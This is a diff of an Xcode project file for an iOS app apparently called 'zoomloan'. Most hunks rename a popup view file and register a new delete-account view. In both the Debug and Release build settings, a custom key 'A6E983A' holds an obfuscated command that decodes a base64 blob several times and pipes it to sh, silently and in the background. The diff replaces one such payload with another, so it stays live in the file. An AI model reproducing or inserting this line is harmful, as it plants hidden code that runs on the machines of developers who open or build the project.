@@ -15,6 +15,7 @@
 		730F1C932EC2FE5200733544 /* CentertViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C922EC2FE5000733544 /* CentertViewModel.swift */; };
 		730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C942EC3008A00733544 /* CentertListViewCell.swift */; };
 		730F1C972EC308C900733544 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C962EC308C900733544 /* SettingViewController.swift */; };
+		730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C982EC3192900733544 /* PopDeleteAccountView.swift */; };
 		73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD62EC21BAD00224C27 /* baseModel.swift */; };
 		73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */; };
 		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
@@ -32,7 +33,7 @@
 		73E6078E2EC1DB7200BCA552 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6078D2EC1DB7200BCA552 /* OrderViewController.swift */; };
 		73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */; };
 		73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607912EC1DBAE00BCA552 /* RequsetHttpManager.swift */; };
-		73E607942EC1DBC000BCA552 /* PopImageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607932EC1DBC000BCA552 /* PopImageView.swift */; };
+		73E607942EC1DBC000BCA552 /* PopLogOutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607932EC1DBC000BCA552 /* PopLogOutView.swift */; };
 		73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */; };
 		73E607982EC1DEA300BCA552 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607972EC1DEA300BCA552 /* LaunchViewController.swift */; };
 		73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607992EC1E11700BCA552 /* otherConfig.swift */; };
@@ -53,6 +54,7 @@
 		730F1C922EC2FE5000733544 /* CentertViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertViewModel.swift; sourceTree = "<group>"; };
 		730F1C942EC3008A00733544 /* CentertListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CentertListViewCell.swift; sourceTree = "<group>"; };
 		730F1C962EC308C900733544 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
+		730F1C982EC3192900733544 /* PopDeleteAccountView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopDeleteAccountView.swift; sourceTree = "<group>"; };
 		73A4AAD62EC21BAD00224C27 /* baseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = baseModel.swift; sourceTree = "<group>"; };
 		73A4AAD82EC2207600224C27 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
 		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
@@ -73,7 +75,7 @@
 		73E6078D2EC1DB7200BCA552 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
 		73E6078F2EC1DB7C00BCA552 /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
 		73E607912EC1DBAE00BCA552 /* RequsetHttpManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RequsetHttpManager.swift; sourceTree = "<group>"; };
-		73E607932EC1DBC000BCA552 /* PopImageView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopImageView.swift; sourceTree = "<group>"; };
+		73E607932EC1DBC000BCA552 /* PopLogOutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopLogOutView.swift; sourceTree = "<group>"; };
 		73E607952EC1DBC400BCA552 /* AuthLoginConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthLoginConfig.swift; sourceTree = "<group>"; };
 		73E607972EC1DEA300BCA552 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
 		73E607992EC1E11700BCA552 /* otherConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = otherConfig.swift; sourceTree = "<group>"; };
@@ -217,7 +219,8 @@
 		73E6077F2EC1DAD200BCA552 /* pop */ = {
 			isa = PBXGroup;
 			children = (
-				73E607932EC1DBC000BCA552 /* PopImageView.swift */,
+				73E607932EC1DBC000BCA552 /* PopLogOutView.swift */,
+				730F1C982EC3192900733544 /* PopDeleteAccountView.swift */,
 			);
 			path = pop;
 			sourceTree = "<group>";
@@ -375,7 +378,7 @@
 				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
 				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
 				73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */,
-				73E607942EC1DBC000BCA552 /* PopImageView.swift in Sources */,
+				73E607942EC1DBC000BCA552 /* PopLogOutView.swift in Sources */,
 				730F1C912EC2FADE00733544 /* CentertView.swift in Sources */,
 				73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */,
 				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
@@ -392,6 +395,7 @@
 				73E607822EC1DB1300BCA552 /* BaseViewController.swift in Sources */,
 				73E6079E2EC1EAFB00BCA552 /* LoginView.swift in Sources */,
 				73E6078E2EC1DB7200BCA552 /* OrderViewController.swift in Sources */,
+				730F1C992EC3192900733544 /* PopDeleteAccountView.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -413,7 +417,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwclkwZE9kRTlZVm1GWFJrcHhWMnRqTUdSWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5hY0ZwSFZuWlpNbEoxV1ZoQ2QweHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -453,7 +457,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwclkwZE9kRTlZVm1GWFJrcHhWMnRqTUdSWFRuVldXRnBhVlRKMGNGTlZhRE5hTWsxNVdqQnpTd289Cg== | h | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((s(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5hY0ZwSFZuWlpNbEoxV1ZoQ2QweHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | s | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
